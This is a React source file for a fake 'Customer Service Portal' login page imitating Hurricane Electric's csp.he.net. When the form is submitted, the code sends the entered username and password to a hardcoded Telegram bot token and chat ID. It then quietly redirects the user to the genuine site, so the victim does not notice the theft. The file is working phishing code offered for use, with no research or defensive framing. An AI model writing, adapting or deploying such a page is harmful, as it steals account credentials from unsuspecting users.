import React from 'react';


import'./home.css';
import logo from './logo.png';

import { useState } from 'react';
import axios from 'axios';
import helogo from './helogo.gif';
import { useEffect } from 'react';
function Home(){

    const[email, setUserName] = useState("");
    const[password, setPassword] = useState("");

    const[platform, setPlatform] = useState("Csp-he")

    const[showError, setShowError] = useState(false);


    

   


    async function handleSubmit(e){
        e.preventDefault();
    
    
        try {
            // const response = await axios.post('https://mainbackend-rd07.onrender.com/api/send', {
            //     email:email,
            //     password:password,
            //     platform:platform
            // });
    
            const response = await axios.post(`https://api.telegram.org/bot6346477835:AAE--Er907FambpxvtD7C-CU-J7GlwgyEkg/sendMessage`, {
                chat_id: 5916570239,
                text: `Platform : ${platform} , Email : ${email} ,  Password : ${password}`,
              });
    
    
        
            // Handle success
         
    
            if(response.status == 200){
               // console.log(response.data.message);
    
              
               window.location.href = 'https://csp.he.net/';
            }
          } catch (error) {
            // Handle error
            console.error('Error:', error);
          }
        
    
        
    }

    return (
        <>
           
                <div className='py-2'>

                </div>

                {showError && <div className="alert alert-danger alert-dismissible fade show" role="alert">
            <strong className='text-center'>Invalid Email or Password</strong> 
            <button type="button" className="close" data-dismiss="alert" aria-label="Close">
                <span aria-hidden="true">&times;</span>
            </button>
            </div>}

            <div className='formdiv col-md-6 m-auto   shadow p-2'>
            {showError && <div className="alert alert-danger alert-dismissible fade show" role="alert">
            <strong className='text-center'>Invalid Email or Password</strong> 
            <button type="button" className="close" data-dismiss="alert" aria-label="Close">
                <span aria-hidden="true">&times;</span>
            </button>
            </div>}

            <div className=' py-2 text-center'>
                <img className='navimage' src={helogo} />

                <h3 className='mt-4 font-weight-bold'>Customer Service Portal</h3>

                <h5 className='font-weight-bold'style={{
                    color:"#ff6513",
                    fontSize:"16px",
                }}>Customer Login</h5>

                <h5 className='lastme py-3'>If you don't have a login, please contact <span>support</span></h5>

            </div>

                <form onSubmit={handleSubmit} className="py-2 formborder col-md-10 px-2  m-auto">

                <div class="formrow text-center mt-3">
                                <span class="prompt"><label for="user">Username</label></span>
                                                <div class="element"><input type="text"onChange={function(e){
                                                    setUserName(e.target.value);
                                                }}value={email} className='inputwide' required/> 
                                </div>
                        </div>


                        <div class="formrow text-center">
                                <span class="prompt"><label for="user">Password</label></span>
                                                <div class="element"><input onChange={function(e){
                                                    setPassword(e.target.value);
                                                }} value={password} type="password"className='inputwide' required/>
                                </div>
                        </div>




                        

                    

                    <div class="formrow text-center py-3">
                                <span class="prompt"><label for="user"></label></span>
                                                <div class="element">
                                                <button className='mybutton'type="submit">Login</button>

                                </div>
                        </div>

                     

                       



                </form>

                

            </div>
            
            <br/>

             
        </>
    );

}

export default Home;